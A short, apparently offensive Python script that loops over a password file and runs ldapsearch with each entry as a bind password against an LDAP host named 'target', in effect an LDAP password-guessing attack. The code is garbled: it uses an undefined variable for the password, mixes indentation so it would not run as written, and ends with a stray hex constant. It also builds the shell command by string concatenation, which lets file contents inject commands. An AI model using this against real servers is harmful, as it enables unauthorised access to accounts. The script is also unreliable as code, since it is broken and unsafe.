import os
import sys

with open(sys.argv[1]) as passwordFile:
        line=passwordFile.readline()
        while line != "":
                print(line)
                line=passwordFile.readline()
		os.system("ldapsearch -vvv -x -w "+i+" -H ldap://target -s base -b \"\" namingContexts")
		
		0xa1a0a0d474e5089
